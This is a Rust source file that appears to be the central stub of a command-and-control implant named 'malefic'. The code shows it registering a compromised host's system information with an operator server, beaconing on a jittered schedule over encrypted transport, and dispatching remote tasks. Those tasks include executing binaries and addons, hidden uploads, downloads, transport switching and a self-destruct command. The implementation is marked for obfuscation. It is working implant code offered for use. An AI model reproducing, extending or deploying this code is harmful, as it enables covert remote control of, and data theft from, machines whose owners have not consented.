use anyhow::anyhow;
use futures::SinkExt;
use futures_timer::Delay;
use malefic_gateway::lazy_static;
use std::str::FromStr;
use std::time::Duration;

use crate::channel::MaleficChannel;
use crate::composition::default_manager;
use crate::meta::MetaConfig;
use malefic_common::check_body;
use malefic_common::debug;
use malefic_common::errors::MaleficError;
use malefic_config as config;
use malefic_manager::internal::InternalModule;
use malefic_manager::manager::MaleficManager;
#[cfg(not(feature = "secure"))]
use malefic_proto::new_empty_spite;
use malefic_proto::proto::{
    implantpb,
    implantpb::spite::Body,
    implantpb::{Spite, Spites},
    modulepb,
};
use malefic_proto::{new_error_spite, new_spite};
use malefic_scheduler::TaskOperator;

// ============================================================================
// Common Helper Functions
// ============================================================================

/// Get Cryptor instance
///
/// Create encryptor using configured key, IV is the reverse of the key
pub fn get_cryptor() -> malefic_crypto::crypto::Cryptor {
    let key = config::get_transport_key();
    let iv: Vec<u8> = key.iter().rev().cloned().collect();
    malefic_crypto::crypto::new_cryptor(key, iv)
}

/// Build Connection
///
/// Build Connection instance using unified configuration
///
/// # Parameters
///
/// - `transport`: Underlying transport connection
/// - `session_id`: Session ID (4 bytes)
/// - `encrypt_key`: Optional encryption key (server's public key for age encryption)
/// - `decrypt_key`: Optional decryption key (implant's private key for age decryption)
pub fn build_connection(
    transport: malefic_transport::InnerTransport,
    session_id: [u8; 4],
    encrypt_key: Option<&str>,
    decrypt_key: Option<&str>,
) -> anyhow::Result<malefic_transport::Connection> {
    malefic_transport::ConnectionBuilder::new(transport)
        .with_cryptor(get_cryptor())
        .with_session_id(session_id)
        .with_encrypt_key(encrypt_key)
        .with_decrypt_key(decrypt_key)
        .build()
        .map_err(|e| anyhow::anyhow!("Failed to build connection: {:?}", e))
}

pub fn build_connection_for_server(
    transport: malefic_transport::InnerTransport,
    session_id: [u8; 4],
    encrypt_key: Option<&str>,
    decrypt_key: Option<&str>,
    server_config: &config::ServerConfig,
) -> anyhow::Result<malefic_transport::Connection> {
    let session_config = session_config_for_server(server_config);
    malefic_transport::ConnectionBuilder::new(transport)
        .with_cryptor(get_cryptor())
        .with_session_id(session_id)
        .with_encrypt_key(encrypt_key)
        .with_decrypt_key(decrypt_key)
        .with_config(session_config)
        .build()
        .map_err(|e| anyhow::anyhow!("Failed to build connection: {:?}", e))
}

pub fn session_config_for_server(
    server_config: &config::ServerConfig,
) -> malefic_transport::SessionConfig {
    malefic_transport::SessionConfig {
        read_chunk_size: server_config.session_config.read_chunk_size,
        deadline: server_config.session_config.deadline,
    }
}

pub fn connect_timeout_for_server(server_config: &config::ServerConfig) -> Duration {
    server_config.session_config.connect_timeout
}

pub fn default_keepalive_for_server(server_config: &config::ServerConfig) -> bool {
    server_config.session_config.keepalive
}

const SPITE_DEBUG_DUMP_LIMIT: usize = 2048;
const SPITES_DEBUG_DUMP_LIMIT: usize = 1024;

fn body_log_summary(body: &Body) -> String {
    match body {
        Body::Empty(_) => "Empty".to_string(),
        Body::Ping(ping) => format!("Ping[nonce={}]", ping.nonce),
        Body::Ack(ack) => format!(
            "Ack[id={}, success={}, end={}]",
            ack.id, ack.success, ack.end
        ),
        Body::Task(task) => format!("Task[task_id={}, op={}]", task.task_id, task.op),
        Body::Common(common) => format!(
            "Common[name={}, u32={}, u64={}, bool={}, string={}, bytes={}]",
            common.name,
            common.u32_array.len(),
            common.u64_array.len(),
            common.bool_array.len(),
            common.string_array.len(),
            common.bytes_array.len()
        ),
        Body::Register(register) => format!(
            "Register[name={}, proxy={}, modules={}, addons={}, has_timer={}, has_sysinfo={}, secure={}]",
            register.name,
            register.proxy,
            register.module.len(),
            register.addons.len(),
            register.timer.is_some(),
            register.sysinfo.is_some(),
            register.secure.as_ref().map(|secure| secure.enable).unwrap_or(false)
        ),
        Body::Init(init) => format!("Init[data_len={}]", init.data.len()),
        Body::Request(req) => format!(
            "Request[name={}, input_len={}, args={}, params={}, bin_len={}]",
            req.name,
            req.input.len(),
            req.args.len(),
            req.params.len(),
            req.bin.len()
        ),
        Body::Response(resp) => format!(
            "Response[output_len={}, error_len={}, kv={}, array={}]",
            resp.output.len(),
            resp.error.len(),
            resp.kv.len(),
            resp.array.len()
        ),
        Body::ExecuteBinary(exec) => format!(
            "ExecuteBinary[name={}, type={}, process_name={}, args={}, param={}, bin_len={}, data_len={}, output={}]",
            exec.name,
            exec.r#type,
            exec.process_name,
            exec.args.len(),
            exec.param.len(),
            exec.bin.len(),
            exec.data.len(),
            exec.output
        ),
        Body::BinaryResponse(resp) => format!(
            "BinaryResponse[status={}, data_len={}, message_len={}, err_len={}]",
            resp.status,
            resp.data.len(),
            resp.message.len(),
            resp.err.len()
        ),
        Body::ExecResponse(resp) => format!(
            "ExecResponse[status_code={}, stdout_len={}, stderr_len={}, pid={}, end={}]",
            resp.status_code,
            resp.stdout.len(),
            resp.stderr.len(),
            resp.pid,
            resp.end
        ),
        Body::UploadRequest(req) => format!(
            "UploadRequest[name={}, target={}, data_len={}, hidden={}, override={}]",
            req.name,
            req.target,
            req.data.len(),
            req.hidden,
            req.r#override
        ),
        Body::DownloadRequest(req) => format!(
            "DownloadRequest[path={}, name={}, buffer_size={}, dir={}, cur={}]",
            req.path, req.name, req.buffer_size, req.dir, req.cur
        ),
        Body::DownloadResponse(resp) => format!(
            "DownloadResponse[checksum_len={}, size={}, cur={}, content_len={}]",
            resp.checksum.len(),
            resp.size,
            resp.cur,
            resp.content.len()
        ),
        Body::Block(block) => format!(
            "Block[block_id={}, content_len={}, end={}]",
            block.block_id,
            block.content.len(),
            block.end
        ),
        Body::KeyExchangeRequest(req) => format!(
            "KeyExchangeRequest[public_key_len={}, signature_len={}, timestamp={}, nonce_len={}]",
            req.public_key.len(),
            req.signature.len(),
            req.timestamp,
            req.nonce.len()
        ),
        Body::KeyExchangeResponse(resp) => {
            format!("KeyExchangeResponse[public_key_len={}]", resp.public_key.len())
        }
        _ => "body=elided".to_string(),
    }
}

fn spite_log_summary(spite: &Spite) -> String {
    let body_summary = spite
        .body
        .as_ref()
        .map(body_log_summary)
        .unwrap_or_else(|| "None".to_string());

    format!(
        "task_id={}, name={}, async={}, error={}, len={}, body={}",
        spite.task_id,
        spite.name,
        spite.r#async,
        spite.error,
        malefic_proto::get_message_len(spite),
        body_summary
    )
}

fn spites_log_summary(spites: &Spites) -> String {
    let preview_limit = 4usize;
    let total = spites.spites.len();
    let mut parts = spites
        .spites
        .iter()
        .take(preview_limit)
        .map(spite_log_summary)
        .collect::<Vec<_>>();

    if total > preview_limit {
        parts.push(format!("... +{} more", total - preview_limit));
    }

    format!(
        "count={}, len={}, [{}]",
        total,
        malefic_proto::get_message_len(spites),
        parts.join(" | ")
    )
}

#[doc(hidden)]
pub fn spite_log_output(spite: &Spite) -> String {
    #[cfg(debug_assertions)]
    if malefic_proto::get_message_len(spite) <= SPITE_DEBUG_DUMP_LIMIT {
        return format!("{:#?}", spite);
    }
    spite_log_summary(spite)
}

#[doc(hidden)]
pub fn spites_log_output(spites: &Spites) -> String {
    #[cfg(debug_assertions)]
    if malefic_proto::get_message_len(spites) <= SPITES_DEBUG_DUMP_LIMIT {
        return format!("{:#?}", spites);
    }
    spites_log_summary(spites)
}

// ============================================================================
// Data Structures
// ============================================================================

lazy_static! {
    pub static ref EMPTY_SPITES: Spites = Spites {
        spites: vec![Spite::default()]
    };
}

/// Pending switch operation to be consumed by the beacon layer
pub struct PendingSwitch {
    pub action: i32,
    pub targets: Vec<modulepb::Target>,
    pub key: Vec<u8>,
}

pub struct MaleficStub {
    pub manager: MaleficManager,
    pub meta: MetaConfig,
    pub channel: MaleficChannel,
    default_keepalive_enabled: bool,
    /// KeepAlive status flag (dynamically controlled by server)
    pub keepalive_enabled: bool,
    /// Pending switch operation, consumed by beacon after session loop exits
    pub pending_switch: Option<PendingSwitch>,
}

#[malefic_gateway::obfuscate]
impl MaleficStub {
    pub fn new(instance_id: [u8; 4], channel: MaleficChannel) -> Self {
        if let Ok(manager) = default_manager() {
            let default_keepalive_enabled = *config::KEEPALIVE;
            MaleficStub {
                manager,
                meta: MetaConfig::new(instance_id),
                channel,
                default_keepalive_enabled,
                keepalive_enabled: default_keepalive_enabled,
                pending_switch: None,
            }
        } else {
            panic!("origin modules refresh failed");
        }
    }

    pub fn apply_server_defaults(&mut self, server_config: &config::ServerConfig) {
        self.default_keepalive_enabled = default_keepalive_for_server(server_config);
        self.keepalive_enabled = self.default_keepalive_enabled;
    }

    pub fn reset_keepalive_state(&mut self) {
        self.keepalive_enabled = self.default_keepalive_enabled;
    }

    pub fn register_spite(&mut self) -> Spite {
        let sysinfo = crate::sys::get_register_info();
        debug!("sysinfo: {:#?}", sysinfo);

        let secure = {
            #[cfg(feature = "secure")]
            {
                // Always advertise secure capability when feature is enabled,
                // even during cold start (empty keys). This tells the server
                // to create a SecureManager and trigger key exchange.
                let public_key = self.meta.get_public_key().unwrap_or_default();
                Some(modulepb::Secure {
                    enable: true,
                    key: String::new(),
                    r#type: "age".to_string(),
                    public_key,
                })
            }
            #[cfg(not(feature = "secure"))]
            {
                None
            }
        };
        debug!("internal modules: {:?}", InternalModule::all());
        new_spite(
            0,
            "register".to_string(),
            Body::Register(modulepb::Register {
                name: config::NAME.to_string(),
                proxy: config::PROXY_URL.to_string(),
                module: self.manager.list_module(InternalModule::all()).0,
                #[cfg(feature = "addon")]
                addons: self.manager.list_addon(),
                #[cfg(not(feature = "addon"))]
                addons: Vec::new(),
                sysinfo,
                timer: Some(modulepb::Timer {
                    expression: config::CRON.to_string(), // Cron expression controls scheduling
                    jitter: config::JITTER.clone() as f64,
                }),
                secure,
            }),
        )
    }

    pub async fn push(&mut self, spite: Spite) -> anyhow::Result<()> {
        self.channel.data_sender.send(spite).await?;
        Ok(())
    }

    pub async fn handler(&mut self, spites: Spites) -> anyhow::Result<()> {
        for spite in spites.spites {
            #[cfg(debug_assertions)]
            {
                debug!("Received {}", spite_log_output(&spite));
            }
            match self.handler_spite(spite.clone()).await {
                Ok(_) => {
                    debug!("{}:{} sender succ", spite.task_id, spite.name)
                }
                Err(e) => {
                    debug!("handler encountered an error: {:#?}", e);
                    let error_id = if let Some(malefic_error) = e.downcast_ref::<MaleficError>() {
                        malefic_error.id()
                    } else {
                        999
                    };
                    self.push(new_error_spite(spite.task_id, spite.name, error_id))
                        .await?
                }
            }
        }
        Ok(())
    }

    pub async fn handler_spite(&mut self, req: Spite) -> anyhow::Result<()> {
        // Init is special: needs to set meta.id and uses stub-specific register info.
        if req.name == "init" {
            let init = check_body!(req, Body::Init)?;
            let id: [u8; 4] = init
                .data
                .try_into()
                .map_err(|_| anyhow!("Expected a Vec<u8> of length 4"))?;
            self.meta.set_id(id);
            let spite = self.register_spite();
            self.push(spite).await?;
            return Ok(());
        }

        // Try dispatch via manager (handles ping, list_module, refresh, load_module, clear).
        let internal_result = self.manager.dispatch_internal(&req, None);
        match internal_result {
            Ok(Some(spite)) => {
                self.push(spite).await?;
                return Ok(());
            }
            Ok(None) => {} // Not internal — fall through to external module or beacon-only
            Err(MaleficError::BeaconOnly(_)) => {} // Beacon-only — handle below
            Err(e) => return Err(e.into()),
        }

        // Beacon-only internal modules.
        match InternalModule::from_str(req.name.as_str()) {
            #[cfg(feature = "addon")]
            Ok(InternalModule::LoadAddon) => {
                self.manager.load_addon(req.clone())?;
                self.push(new_spite(
                    req.task_id,
                    InternalModule::LoadAddon.to_string(),
                    Body::Empty(implantpb::Empty::default()),
                ))
                .await?;
            }
            #[cfg(feature = "addon")]
            Ok(InternalModule::ListAddon) => {
                self.push(new_spite(
                    req.task_id,
                    InternalModule::ListAddon.to_string(),
                    Body::Addons(modulepb::Addons {
                        addons: self.manager.list_addon(),
                    }),
                ))
                .await?;
            }
            #[cfg(feature = "addon")]
            Ok(InternalModule::ExecuteAddon) => {
                let result = self.manager.execute_addon(req)?;
                let module = self
                    .manager
                    .get_module(&result.name)
                    .ok_or_else(|| anyhow!(MaleficError::ModuleNotFound))?;
                let body = result.body.ok_or_else(|| anyhow!(MaleficError::MissBody))?;
                self.channel
                    .scheduler_task_sender
                    .send((result.r#async, result.task_id, module.new_instance(), body))
                    .await?;
            }
            #[cfg(feature = "addon")]
            Ok(InternalModule::RefreshAddon) => {
                self.manager.refresh_addon()?;
                self.push(new_spite(
                    req.task_id,
                    InternalModule::RefreshAddon.to_string(),
                    Body::Empty(implantpb::Empty::default()),
                ))
                .await?;
            }
            Ok(InternalModule::CancelTask) => {
                if let Some(Body::Task(task)) = req.body {
                    self.channel
                        .scheduler_task_ctrl
                        .send((req.task_id, TaskOperator::CancelTask(task.task_id)))
                        .await?;
                }
            }
            Ok(InternalModule::QueryTask) => {
                if let Some(Body::Task(task)) = req.body {
                    self.channel
                        .scheduler_task_ctrl
                        .send((req.task_id, TaskOperator::QueryTask(task.task_id)))
                        .await?;
                }
            }
            Ok(InternalModule::ListTask) => {
                self.channel
                    .scheduler_task_ctrl
                    .send((req.task_id, TaskOperator::ListTask))
                    .await?;
            }
            Ok(InternalModule::Sleep) => {
                let sleep = check_body!(req, Body::SleepRequest)?;
                self.meta
                    .update_schedule(&*sleep.expression, sleep.jitter)?;
                self.push(new_spite(
                    req.task_id,
                    InternalModule::Sleep.to_string(),
                    Body::Empty(implantpb::Empty::default()),
                ))
                .await?;
            }
            Ok(InternalModule::Suicide) => {
                self.push(new_spite(
                    req.task_id,
                    InternalModule::Suicide.to_string(),
                    Body::Empty(implantpb::Empty::default()),
                ))
                .await?;
                Delay::new(Duration::from_secs(10)).await;
                std::process::exit(0);
            }
            Ok(InternalModule::Switch) => {
                let switch = check_body!(req, Body::Switch)?;
                self.pending_switch = Some(PendingSwitch {
                    action: switch.action,
                    targets: switch.targets,
                    key: switch.key,
                });
                self.push(new_spite(
                    req.task_id,
                    InternalModule::Switch.to_string(),
                    Body::Empty(implantpb::Empty::default()),
                ))
                .await?
            }
            Ok(InternalModule::KeyExchange) => {
                let key_request = check_body!(req, Body::KeyExchangeRequest)?;
                let key_resp = self.handle_key_exchange(req.task_id, key_request).await?;
                self.push(key_resp).await?;
            }
            Ok(InternalModule::KeepAlive) => {
                let enable = if let Some(Body::Common(common)) = &req.body {
                    common.bool_array.get(0).copied().unwrap_or(false)
                } else {
                    false
                };
                debug!("[keepalive] Received keepalive request: enable={}", enable);
                self.keepalive_enabled = enable;
                self.push(new_spite(
                    req.task_id,
                    InternalModule::KeepAlive.to_string(),
                    Body::Common(modulepb::CommonBody {
                        bool_array: vec![enable],
                        ..Default::default()
                    }),
                ))
                .await?;
            }
            // Already handled by dispatch_internal or not an internal module.
            _ => {
                debug!("Dispatch {}", spite_log_output(&req));
                let body = req.body.ok_or_else(|| anyhow!(MaleficError::MissBody))?;
                let module = self
                    .manager
                    .get_module(&req.name)
                    .ok_or_else(|| anyhow!(MaleficError::ModuleNotFound))?;
                self.channel
                    .scheduler_task_sender
                    .send((req.r#async, req.task_id, module.new_instance(), body))
                    .await?;
            }
        };
        Ok(())
    }

    async fn handle_key_exchange(
        &mut self,
        task_id: u32,
        _key_request: modulepb::KeyExchangeRequest,
    ) -> anyhow::Result<Spite> {
        #[cfg(feature = "secure")]
        {
            // Validate timestamp (skip if 0 for backward compat with old server)
            if _key_request.timestamp > 0 {
                let now = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs();
                if now.abs_diff(_key_request.timestamp) > 120 {
                    return Err(anyhow!(
                        "key exchange request expired (timestamp drift > 120s)"
                    ));
                }
            }

            // Reject replayed nonces
            if !self.meta.check_and_record_nonce(&_key_request.nonce) {
                return Err(anyhow!("replayed key exchange nonce"));
            }

            // Verify HMAC signature if present (empty = old server, skip)
            if !_key_request.signature.is_empty() {
                use hmac::{Hmac, Mac};
                use sha2::Sha256;
                type HmacSha256 = Hmac<Sha256>;

                let transport_key = config::get_transport_key();
                let mut mac = HmacSha256::new_from_slice(&transport_key)
                    .map_err(|e| anyhow!("HMAC init failed: {}", e))?;
                mac.update(_key_request.public_key.as_bytes());
                mac.update(_key_request.timestamp.to_string().as_bytes());
                mac.update(_key_request.nonce.as_bytes());
                mac.verify_slice(&_key_request.signature)
                    .map_err(|_| anyhow!("key exchange HMAC signature verification failed"))?;
            }

            let (private_key, public_key) = malefic_proto::generate_age_keypair();
            let next_server_public_key = if _key_request.public_key.is_empty() {
                None
            } else {
                Some(_key_request.public_key)
            };

            // Cache pending keys first. Keep active keys until response is sent successfully.
            self.meta
                .cache_key_exchange(private_key, next_server_public_key);
            Ok(new_spite(
                task_id,
                "key_exchange".to_string(),
                Body::KeyExchangeResponse(modulepb::KeyExchangeResponse { public_key }),
            ))
        }
        #[cfg(not(feature = "secure"))]
        {
            Ok(new_empty_spite(task_id, "key_ack".to_string()))
        }
    }

    // ========================================================================
    // Common interaction logic (shared by Bind and Beacon)
    // ========================================================================

    /// Prepare Spites to send
    ///
    /// Get data to send from channel
    pub async fn prepare_spites(&mut self) -> anyhow::Result<Spites> {
        // Request data
        self.channel.request_sender.send(true).await?;

        // Get data
        let spites = if let Some(data) =
            futures::StreamExt::next(&mut self.channel.response_receiver).await
        {
            data
        } else {
            Spites { spites: vec![] }
        };

        #[cfg(debug_assertions)]
        {
            if !spites.spites.is_empty() {
                debug!("Sending {}", spites_log_output(&spites));
            }
        }

        Ok(spites)
    }

    /// Prepare request data (send data if available, otherwise send ping)
    pub async fn prepare_request(&mut self) -> anyhow::Result<Spites> {
        // Try to get data to send
        let spites = self.prepare_spites().await?;

        // If no data, send ping
        if spites.spites.is_empty() {
            Ok(Self::create_ping())
        } else {
            Ok(spites)
        }
    }

    /// Create ping message
    pub fn create_ping() -> Spites {
        let ping_spite = new_spite(
            0,
            "ping".to_string(),
            Body::Ping(modulepb::Ping {
                nonce: std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs() as i32,
            }),
        );
        Spites {
            spites: vec![ping_spite],
        }
    }

    pub fn contains_key_exchange_response(spites: &Spites) -> bool {
        spites
            .spites
            .iter()
            .any(|spite| matches!(spite.body.as_ref(), Some(Body::KeyExchangeResponse(_))))
    }

    #[cfg(feature = "secure")]
    pub fn should_reconnect_after_key_exchange(&mut self) -> bool {
        if self.meta.commit_key_exchange_if_ready() {
            debug!("[secure] key exchange committed, reconnecting with new keys");
            return true;
        }
        false
    }

    #[cfg(not(feature = "secure"))]
    #[allow(dead_code)]
    pub fn should_reconnect_after_key_exchange(&mut self) -> bool {
        false
    }

    pub fn should_reconnect_for_switch(&self) -> bool {
        self.pending_switch.is_some()
    }

    pub fn take_pending_switch(&mut self) -> Option<PendingSwitch> {
        self.pending_switch.take()
    }
}
